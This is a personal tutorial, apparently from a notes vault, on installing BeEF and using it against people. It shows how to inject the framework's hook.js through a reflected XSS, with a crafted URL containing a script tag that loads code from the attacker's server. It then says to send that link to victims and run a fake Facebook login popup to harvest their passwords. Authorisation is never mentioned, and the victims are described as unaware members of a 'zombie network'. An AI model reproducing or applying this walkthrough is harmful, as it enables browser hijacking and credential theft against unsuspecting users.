---
title: BeEF
aliases:
  - BeEF
tags:
  - BeEF
  - XSS
description: BeEF is a security tool, allowing a penetration tester or system administrator additional attack vectors when assessing the posture of a target.
---
![[images/Pasted image 20241227174221.png]]

If you find an XXS, you can not only cause a victim to become part of your pseudo-botnet but you can also steal the contents of the copy memory , redirect them to links, turn on thier camera, and so much more using **BeEF Exploitation Framwork**.

# Installation
---
The first thing I am going to do is **install Ruby** on my Ubuntu 18.04 . To do this we want to run the following command:

```bash
sudo apt install ruby ruby-dev
```

The next step is to get the **BeEF source files. We will get these from git**. If you haven’t installed git, make sure to run the following command first:

```sh
sudo apt install git
```

Once git is available, we can **clone the git project** with the following command:

```sh
git clone https://github.com/beefproject/beef
```

This will download the source files for BeEF. **Next, move into the beef directory**:

```sh
cd beef
```

This is where the I started to **run into an issue**. The original beef instructions say to just run:

```sh
./install
```

However, when I did this, **I received a permission error.** To resolve that I ran:

```sh
sudo ./install
```

Once the **installation was successfully completed**, run this command to start **BeEF**:

```sh
./beef
```

![[images/Screenshot from 2024-12-27 19-36-39.png]]

# Attacking
---
Log into the **console UI** after the BeEF server hash started. As we see from the image above, the **UI URL is located at** http://127.0.0.1:3000/ui/panel. Open a browser and **go to that URL**.

![[images/Screenshot from 2024-12-27 19-49-27.png]]

**Login using the username and password beef:beef**

If we look back to the Terminal where we had started our BeEF server, we can see that there are two URL first UI URL 'http://172.26.114.224:3000/ui/panel' and second Hook URL 'http://172.26.114.224:3000/hook.js'. This is well obfuscated JavaScript payload that will control the victim user and will be injected into the victim brower's page. Once injected, their browser will connect back into your central server and the victim will be unaware.

Once we have located an XSS vulnerability on a page, we can use BeEF to exploit the end user. For Example, http://site.com/example.php?alert=, the alert variable takes any input and presents it to the end user. We can craft the URL to include the hook.js file. It will look something like: `http://site.com/example.php?alert=asda<script src=http://172.26.114.224:3000/hook.js></script>`.

Send this Crafted URL to victim and as soon as the victim will open the link in its browser, they will be part of your XSS zombie network.Going back to our UI panel, we should now see a victim has joined our server.


![[images/Screenshot from 2024-12-27 21-18-40.png]]

With an account hooked, there are many different modules within BeEF to exploit the end user. As from the image below, you can try to steal stored credentials, get host IP information, scan hosts within their network, and so much more.

![[images/Pasted image 20241227213127.png]]

One of my favorite attacks is called “petty theft” because of how simple it is. Drop down to Social Engineering folder and to Petty Theft. Configure how you want it, in this case we’ll use the Facebook example, and hit execute. Remember the IP for the custom logo field has to be your BeEF IP. This is so the victim can grab the image from your server.

![[images/Pasted image 20241227214106.png]]

After the attacker clicks Execute, on the victim’s system a Facebook password prompt will pop up. This is where you can get creative in targeting your users and use a popup that they would most likely enter. If you are looking to gain Google accounts, there is also a Google Phishing module. The purpose of this client side attack is that they are unaware that they are part of this zombie network and
the password prompt should seem like it is not out of the ordinary.

After the unsuspecting victim types in their password, go back to the UI to find your loot.

